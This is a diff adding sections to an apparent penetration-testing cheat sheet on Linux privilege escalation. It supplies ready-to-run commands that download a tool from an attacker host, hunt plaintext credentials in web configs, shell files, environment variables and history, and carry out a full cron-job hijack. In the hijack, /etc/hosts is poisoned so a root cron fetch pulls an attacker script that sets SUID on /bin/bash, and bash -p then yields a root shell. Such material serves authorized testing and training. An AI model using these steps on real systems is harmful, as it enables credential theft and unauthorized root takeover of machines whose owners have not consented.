@@ -445,7 +445,7 @@ find / -type f -writable 2>/dev/null | grep -v -e '/proc' -e '/sys'
 # Capabilities
 /usr/sbin/getcap -r / 2>/dev/null
 
-# Cron jobs
+# Cron jobs (static — check this first, then run pspy for dynamic jobs)
 cat /etc/crontab
 ls -la /etc/cron*
 
@@ -454,6 +454,72 @@ ss -ntlp
 
 # Files owned by a specific user
 find / -type f -user <username> 2>/dev/null | xargs ls -lah
+```
+
+### pspy — Unprivileged Process Monitoring
+
+Catches root-owned cron jobs and short-lived processes that don't appear in `/etc/crontab`. Run this when static cron enumeration comes up empty — let it sit for at least 2-3 minutes.
+
+```bash
+# Transfer to target
+wget http://<LHOST>:<port>/pspy64 -O /tmp/pspy64
+chmod +x /tmp/pspy64
+./pspy64
+```
+
+Key things to look for:
+
+```
+CMD: UID=0  PID=xxxx  | /bin/sh -c <command>        ← root-owned process
+CMD: UID=0  PID=xxxx  | curl <hostname>/<script> | bash   ← HTTP fetch + exec = hijack candidate
+```
+
+`UID=0` is the signal. Once spotted, ask: can I influence any part of that command — the script path, the hostname it fetches from, the working directory?
+
+### Post-Foothold Credential Hunting
+
+Run these on every user you land on before reaching for automated tools.
+
+```bash
+# CMS / app config files — almost always plaintext creds
+find /var/www -name "*.php" 2>/dev/null | xargs grep -l "password" 2>/dev/null
+cat /var/www/html/*/config/database.php 2>/dev/null
+
+# Shell config — env vars used as credential stash
+cat ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null | grep -i 'pass\|token\|secret\|key\|pwd'
+env | grep -i 'pass\|token\|secret\|key\|pwd'
+
+# Shell history (if not nulled to /dev/null)
+cat ~/.bash_history 2>/dev/null
+cat ~/.mysql_history 2>/dev/null
+
+# Decode any base64 tokens found
+echo '<token>' | base64 -d
+```
+
+### /etc/hosts Poisoning — Cron HTTP Hijack
+
+When a root cron job fetches a script over HTTP using a **hostname** (not an IP or localhost), and `/etc/hosts` is writable:
+
+```bash
+# 1. Confirm /etc/hosts is writable
+ls -la /etc/hosts
+
+# 2. Redirect hostname to attacker machine
+echo "<LHOST>  <hostname>" >> /etc/hosts
+
+# 3. Mirror the expected URL path on attacker and serve payload
+mkdir -p <path/matching/cron/url>
+cat > <path/matching/cron/url>/script.sh <<'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+
+sudo python3 -m http.server <port>
+
+# 4. Wait for cron to fire, then trigger SUID bash
+watch -n 1 ls -lah /bin/bash   # wait until permissions show 'rws'
+bash -p
 ```
 
 ### SUID Binary Analysis — strace
